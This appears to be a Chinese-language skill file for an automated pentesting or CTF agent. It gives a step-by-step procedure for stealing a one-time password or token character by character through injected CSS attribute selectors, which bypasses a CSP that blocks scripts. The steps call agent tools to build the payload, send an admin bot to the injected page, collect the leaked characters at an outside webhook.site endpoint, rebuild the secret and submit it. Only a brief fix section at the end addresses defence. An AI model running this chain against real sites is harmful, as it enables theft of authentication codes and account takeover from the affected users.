---
name: css-exfil-otp
description: 利用 CSS 属性选择器逐字符外带 OTP/Token，绕过 CSP script-src 限制。
version: 1.0.0
category: css_injection
author: agent
tags:
  - css-injection
  - scriptless-xss
  - csp-bypass
  - data-exfiltration
  - otp-theft
created_at: "2026-07-10T00:00:00Z"
updated_at: "2026-07-10T00:00:00Z"
use_count: 0
state: active
---

# CSS 属性选择器逐字符外带 OTP

## 适用场景

- 页面存在 HTML 注入但 CSP `script-src` 阻止了 JS 执行
- CSP `style-src` 包含 `'unsafe-inline'` 或未设置，且 `img-src` 未限制外部图片
- 页面中存在敏感 input 的 `value` 属性（如 OTP 输入框自动填充、CSRF token）
- 存在 `/visit` 等 bot 访问接口，可提交 URL 让 admin bot 加载恶意 CSS

## 前置条件

1. 确认注入参数（如 `ad`、`q`）确实无过滤反射到 HTML
2. `analyze_headers` 确认 CSP 配置缺口
3. 已获取 webhook 接收 URL（如 webhook.site）

## 操作步骤

### 步骤 1：确认注入和 CSP
```
analyze_headers(url)  → 确认 style-src 允许内联样式，img-src 未限制外部
http_get(url + "?param=TEST")  → 确认 TEST 出现在响应 HTML 中
```

### 步骤 2：生成 CSS payload
```
css_exfil_payload(
    url="http://target/?param=INJECT",
    param="param",
    webhook_url="https://webhook.site/YOUR-ID",
    extract_length=6,        # OTP 长度
    charset="digits",        # 纯数字 OTP 用 digits
    selector="input#otp",    # 目标 input 的 CSS 选择器
    mode="prefix"
)
```

### 步骤 3：提交给 bot
```
http_post(
    url="http://target/visit",
    data="url=" + urlencode(injection_url)
)
```

### 步骤 4：还原 secret
```
# 从 webhook.site 复制原始日志
webhook_reconstruct(
    logs="<粘贴日志>",
    param_name="p",          # css_exfil_payload 生成的参数前缀
    charset="digits"
)
```

### 步骤 5：提交获取 flag
```
http_post(
    url="http://target/flag",
    data="otp=<还原的OTP>"
)
```

## 注意事项

- 首轮先设置 `extract_length=1` 验证技术可行，确认 webhook 收到回调后再扩展
- 每轮都需要重新注入新的 CSS（因为下一轮需要已知前缀）
- 纯数字 OTP 用 `digits` (10 个选择器/轮)，hex token 用 `hex` (16 个)
- 字母数字混合用 `alphanumeric` (62 个选择器/轮)，注意 payload 长度限制
- 如果页面中有多个 input，使用更精确的选择器如 `input#otp` 或 `input[name="code"]`

## 修复建议

严格 CSP：`style-src 'self'; img-src 'self'; font-src 'self';`
对用户输入做 HTML 实体编码，过滤 `<style>` 标签和 `url()` 引用。
